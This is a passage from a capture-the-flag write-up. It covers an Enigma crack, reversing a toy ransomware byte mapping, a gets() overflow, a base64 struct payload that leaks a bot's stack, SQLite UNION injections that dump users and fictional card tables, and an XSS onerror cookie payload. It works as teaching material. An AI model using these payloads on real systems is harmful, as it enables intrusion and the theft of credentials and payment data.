- https://www.cryptomuseum.com/crypto/enigma/i/
- https://www.youtube.com/watch?v=ybkkiGtJmkM&t=923s
- https://github.com/Wikunia/Enigma.jl/tree/master?tab=readme-ov-file

The enigma machine essentially is a series of permutations, with circular offsets applied. So I found it efficient to convert into mod 26 numbers and use lookup arrays.

For the crack, looking in the Console tab of the problem we see we are given some hints: the reflector is given by name, and what are obviously plugboard connections, as well as triplets of numbers fo r the ground settings and ring settings, leaving just the 3 rotors to be unknowns. Which are the ring vs ground settings is unclear, and I was given dates, which could have multiple formats: these are all easy to brute force over.

The next challenge however, was choosing the candidate solution. Because the enigma machine only works on letters, there's no spaces on which to split words and check for valid words.
I therefore implemented a trie to find non-overlapping words. A big issue was finding many small word, therefore score decryptions with mostly nonsensical short word strings. Ultimately I found the solution to was score by largest word found.

In the end I got a quote as the decrypted message, submitting it, without spaces, solved it.

The code to do all this is in the ENIGMASolver.ipynb Jupyter Notebook, along with some extra notes on the implementation.


#### Ransom (250 points)
Opening the `ransom` binary is Ghidra we see the `main` function just looks to read a file `"encrypt_me"` into a buffer to then be encrypted with the `encrypt_file` function into a new buffer, and then have the original file written over.

The `encrypt_file` function is actually very simple, here is its decompile:

```C
void encrypt_file(byte *plaintext,uint length,byte *cyphertext)

{
  uint index;
  uint i;
  byte c;
  
  index = length - 1;
  for (i = 0; i < length; i = i + 1) {
    c = plaintext[(int)i];
    if (c < 127) {
      cyphertext[index] = c + 129;
    }
    else if (c < 129) {
      cyphertext[index] = c;
    }
    else {
      cyphertext[index] = c + 127;
    }
    index = index - 1;
  }
  return;
}
```

As we can see each bytes is being offset (with overflow) depending on what range it's in, and put into the output buffer backwards. This is very simple and we can easily write a script to reverse it by inverting the mapping:

```Python
with open('important_company_data_backup.zip.ransomed', 'rb') as f:
    data = f.read()

bmax = 2**8
mapping = [-1]*bmax
for c in range(bmax):
    if c < 127:
        mapping[(c + 129)%bmax] = c
    elif c < 129:
        mapping[c] = c
    else:
        mapping[(c + 127)%bmax] = c
print(mapping)

decrypted_data = bytes([mapping[c] for c in data[::-1]])
print(decrypted_data)
```

The byte data starts with the magic number `PK` indicating it is indeed a .zip file as expected. We can finish off by opening the zip file and reading its contents:

```Python
import zipfile
import io

zip_data = zipfile.ZipFile(io.BytesIO(decrypted_data), 'r')
for name in zip_data.namelist():
    print(f"Contents of {name}")
    with zip_data.open(name, mode='r') as f:
        print(f.read().decode())
```

Which shows all the company secrets, along with the flag in `flag.txt`.
The code to do all this is in the RansomSolver.ipynb Jupyter Notebook.


### Exploitation
#### Stack Overflow (25 points)
The JS console gives some hints on how to test out the C code by compiling without stack protection.
We can see in the code it uses the `gets` function to obtain input, which is a deprecated function due to it reading input indefinitely until an `EOF` character is reached. This allows us to give more data than the input buffer can take, and therefore overflow the input into other memory on the stack.
The data which will be read into the `password` buffer will overflow into the `authenticated` variable. If we overflow too far we do hit a segmentation fault. Since the size of the `password` buffer is 12, we want to use 13 characters to change the value in `authenticated`.
Since `authenticated` is being checked like a boolean, any value other than `0` will work to obtain success.

Using the input `1234567890ab0` will fill password with the chars `"1234567890ab"` while the `char` `'0'` will be read into `authenticated`, since `authenticated` is an `int` this means `'0'` will be cast to its ASCII value 48.


#### Lonely Bot (175 points)
The inputs for the problem allow us to either specify the flag found, or give strings, hinted to be base64 encoded, to be sent to the server, and we receive responses, which are printed in the Console. The responses seem to be from the server running the binary lonelybot provided.

Opening the binary in Ghidra we see the `main` function starts by checking the commandline arguments, the first being `"--help"` which calls the `print_help` function, which prints:

```
I will decode valid base64 and treat it as the following C struct
```

```C
#define MAX_LEN 50
struct MESSAGE {
    unsigned short type;
    unsigned short message_le n;
    char message[];
}
```

That's helpful!

The second commandline argument is `"--flag"`, which simply prints that the flag specified after, and we see it's stored in `argv[2]`.

So the flag isn't in the binary itself, but is in the stack memory the lonelybot program running on the server. From the output we receive, the program is already past the `print_welcome` function, so we can't set it outselves: we need to exploit the bot with input to get it to dump to us the stack memory.

Given the information so far, we can complete the decompile, the trickiest part being the `MESSAGE` struct type of the decoded buffer.

```C

/* WARNING: Restarted to delay deadcode elimination for space: stack */

int main(int argc,char **argv)

{
  long lVar1;
  int strcmp_val;
  time_t t;
  char *response_ptr;
  long in_FS_OFFSET;
  uint i;
  char uinput1 [51];
  MESSAGE b64_value;
  
  lVar1 = *(long *)(in_FS_OFFSET + 40);
  uinput1[0] = '\0';
  uinput1[1] = '\0';
  uinput1[2] = '\0';
  uinput1[3] = '\0';
  uinput1[4] = '\0';
  uinput1[5] = '\0';
  uinput1[6] = '\0';
  uinput1[7] = '\0';
  uinput1[8] = '\0';
  uinput1[9] = '\0';
  uinput1[10] = '\0';
  uinput1[11] = '\0';
  uinput1[12] = '\0';
  uinput1[13] = '\0';
  uinput1[14] = '\0';
  uinput1[15] = '\0';
  uinput1[16] = '\0';
  uinput1[17] = '\0';
  uinput1[18] = '\0';
  uinput1[19] = '\0';
  uinput1[20] = '\0';
  uinput1[21] = '\0';
  uinput1[22] = '\0';
  uinput1[23] = '\0';
  uinput1[24] = '\0';
  uinput1[25] = '\0';
  uinput1[26] = '\0';
  uinput1[27] = '\0';
  uinput1[28] = '\0';
  uinput1[29] = '\0';
  uinput1[30] = '\0';
  uinput1[31] = '\0';
  uinput1[32] = '\0';
  uinput1[33] = '\0';
  uinput1[34] = '\0';
  uinput1[35] = '\0';
  uinput1[36] = '\0';
  uinput1[37] = '\0';
  uinput1[38] = '\0';
  uinput1[39] = '\0';
  uinput1[40] = '\0';
  uinput1[41] = '\0';
  uinput1[42] = '\0';
  uinput1[43] = '\0';
  uinput1[44] = '\0';
  uinput1[45] = '\0';
  uinput1[46] = '\0';
  uinput1[47] = '\0';
  uinput1[48] = '\0';
  uinput1[49] = '\0';
  uinput1[50] = '\0';
  b64_value.type = 0;
  b64_value.message_len = 0;
  b64_value.message[0] = '\0';
  b64_value.message[1] = '\0';
  b64_value.message[2] = '\0';
  b64_value.message[3] = '\0';
  b64_value.message[4] = '\0';
  b64_value.message[5] = '\0';
  b64_value.message[6] = '\0';
  b64_value.message[7] = '\0';
  b64_value.message[8] = '\0';
  b64_value.message[9] = '\0';
  b64_value.message[10] = '\0';
  b64_value.message[11] = '\0';
  b64_value.message[12] = '\0';
  b64_value.message[13] = '\0';
  b64_value.message[14] = '\0';
  b64_value.message[15] = '\0';
  b64_value.message[16] = '\0';
  b64_value.message[17] = '\0';
  b64_value.message[18] = '\0';
  b64_value.message[19] = '\0';
  b64_value.message[20] = '\0';
  b64_value.message[21] = '\0';
  b64_value.message[22] = '\0';
  b64_value.message[23] = '\0';
  b64_value.message[24] = '\0';
  b64_value.message[25] = '\0';
  b64_value.message[26] = '\0';
  b64_value.message[27] = '\0';
  b64_value.message[28] = '\0';
  b64_value.message[29] = '\0';
  b64_value.message[30] = '\0';
  b64_value.message[31] = '\0';
  b64_value.message[32] = '\0';
  b64_value.message[33] = '\0';
  b64_value.message[34] = '\0';
  b64_value.message[35] = '\0';
  b64_value.message[36] = '\0';
  b64_value.message[37] = '\0';
  b64_value.message[38] = '\0';
  b64_value.message[39] = '\0';
  b64_value.message[40] = '\0';
  b64_value.message[41] = '\0';
  b64_value.message[42] = '\0';
  b64_value.message[43] = '\0';
  b64_value.message[44] = '\0';
  b64_value.message[45] = '\0';
  b64_value.message[46] = '\0';
  t = time((time_t *)0);
  srandom((uint)t);
  if (1 < argc) {
    strcmp_val = strcmp(argv[1],"--help");
    if (strcmp_val == 0) {
      print_help();
      if (lVar1 == *(long *)(in_FS_OFFSET + 40)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    strcmp_val = strcmp(argv[1],"--flag");
    if ((strcmp_val == 0) && (2 < argc)) {
      printf("\nFlag specified on command line: %s\n\n",argv[2]);
    }
  }
  print_welcome();
  puts("Hello. How are you? (CNTRL+C to quit)");
  do {
    while( true ) {
      memset(uinput1,0,51);
      memset(&b64_value,0,51);
      printf("base64> ");
      fgets(uinput1,50,(FILE *)stdin);
      strcmp_val = Base64decode_len(uinput1);
      if (strcmp_val < 51) break;
      puts("That message is too long for me to handle");
    }
    Base64decode((byte *)&b64_value,(byte *)uinput1);
    if (b64_value.type == 69) {
      g_debug = 1;
      puts("Now you\'re speaking my language!!");
    }
    else if (b64_value.type == 1337) {
      g_leet = 1;
      puts("1337 5p34k 3n4b13d");
    }
    if (g_debug != 0) {
      puts("Here\'s everything I know about that:");
      for (i = 0; (int)i < (int)(uint)b64_value.message_len; i = i + 1) {
        if ((i != 0) && ((i & 15) == 0)) {
          putchar(L'\n');
        }
        printf("%02x ",(ulong)(byte)b64_value.message[(int)i]);
      }
      putchar(L'\n');
    }
    response_ptr = get_reponse();
    puts(response_ptr);
    puts("Please, tell me more.");
  } while( true );
}
```

So the user input, which goes into `uinput1` is then decoded into bytes put into the `b64_value` `MESSAGE` struct. If `b64_value.type == 69` the bot will print in hex the contents of `b64_value.message`, using `b64_value.message_len` to tell how long it should be. However since we specify `b64_value.message_len` we can tell it to go past the maximum bounds and spill the stack contents.

So how do we craft our input? We can use Python's `struct` and `base64` libraries to do the work for us:

```Python
ushort_max = 2**16-1
print(base64.b64encode(struct.pack("HH",69,ushort_max)).decode())
```

Since `b64_value.type` and `b64_value.message_len` are both `unsigned short`s they are 2 bytes long, and therefore have a maximum value of `2**16-1` which we might as well use for the message length to get as much of the stack as possible. Python's `struct` library uses `"H"` as the format specifier for `unsigned short` and will pack the values given into a byte string. Note we don't actually need to provide any data to fill the message with.

This gives a base64 encoded message of `"RQD//w=="`.

Providing this input to the bot sure enough causes it to return a pile of hex encoded data, ending in a segmentation fault as we run past the stack's end. But we do have the data!

We can copy it from the console, then search for the location of `argv[1]` which we know will contain `"--flag"`, then simply look at the next string after. Both should be terminated by the null byte, as per standard.

```Python
stack_contents = bytes.fromhex(""" {PASTE-HERE} """)
flag_location = stack_contents.find(b'--flag')
print(stack_contents[flag_location:].split(b'\x00')[1].decode())
```

The code to do all this is in the LonelyBotSolver.ipynb Jupyter Notebook.


### Input Validation
#### SQL Login (50 points)
Attempting an SQL injection by escaping the quotes (e.g. input `'`), we get error messages showing the SQL command being executed is: 

```SQL
SELECT username, password FROM users WHERE username='farnsworth' AND password='{INPUT}'
```

Note the `username` in question could be different.
So we can easily escape and use a UNION attack to extract data from the database. The simplest is 

```SQL
' UNION SELECT username,password FROM users WHERE username = 'farnsworth' --
```

Which will show use the password we're looking for, so we can then enter it to complete the challenge.

#### Cross Site Scripting (75 points)
Executing `console.log(document.cookie)` in the Console shows `admin_sess_id=flag_should_be_here%20%F0%9F%A4%94`, which is incorrect. Clearly we need to use XSS to get the true document cookie.
Submitting changes the `src` field of the image to the value given to the "Image URL" field.
Therefore we can inject code to escape the `src` field and use the `onerror` field of `img` tags to execute JavaScript and tell us the cookie.

```JavaScript
" onerror="alert(document.cookie)" dummy="
```

Once we refresh the page and reopen the challenge modal we should see an alert telling up the cookie with the true flag.

#### SQL Credit Cards (100 points)
Similar to the previous SQL challenge, however this time we need to know which column the credit card number will be under, except we don't know which that'll be.
In fact we don't know the database schema at all, and not even the flavor of SQL, so we'll need to do a deeper look into the database.

We can extract more information about the database by first determining which flavor of SQL is being used, which in this case turns out to be SQLite, since it doesn't report an error for using the function `sqlite_version()`. It makes sense for an SQLite instance to be used for a small hacking challenge.
- [Tips For Determining SQL Flavor](https://stackoverflow.com/questions/65306224/determine-flavor-of-sql-being-used)
- [SQL injection payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

We can get the database schema like so:

```SQL
' UNION SELECT sql,NULL FROM sqlite_master WHERE sql NOT NULL --
```

This shows us we have 2 tables:

```SQL
CREATE TABLE credit_cards (username text, card text, cvv integer, exp text)
CREATE TABLE users (username text, password text)
```

And so we can dump the entire database:

```SQL
' UNION SELECT '| ' || rowid || ' | ' || username || ' | ' || password || ' |',NULL FROM users --
```

and

```SQL
' UNION SELECT '| ' || rowid || ' | ' || username || ' | ' || card || ' | ' || cvv || ' | ' || exp || ' |' FROM credit_cards --
```

Which gives us this information:

`users`

| rowid | username | password |
|-|-|-|
| 1 | admin | `Gu3ss_Myp4s%w0rd**` |
| 2 | bender | `b1t3-my-shiny-m3t4l-4$$` |
| 3 | fry | `w4ts-w/-th3-17-dungbeetles` |
| 4 | farnsworth | `P4zuzu!!` |
| 5 | scruffy | `Im_0n-br3ak` |
| 6 | zoidberg | `sp4r3-ch4ng3#$$$` |

`credit_cards`

| rowid | username | card | cvv | exp |
|-|-|-|-|-|
| 1 | admin | 4300713381842928 | 318 | 06/2027 |
| 2 | bender | 4768732694626948 | 669 | 07/2027 |
| 3 | fry | 4385923563192160 | 368 | 11/2021 |
| 4 | farnsworth | 4784981000802194 | 171 | 02/2027 |
| 5 | scruffy | 4987327898009549 | 763 | 11/2019 |
| 6 | zoidberg | 4912753912003772 | 440 | 07/2026 |

We can also more directly complete the challenge:

```SQL
' UNION SELECT card FROM credit_cards WHERE username='farnsworth' --
```

Which will give us the number to submit to complete the challenge.

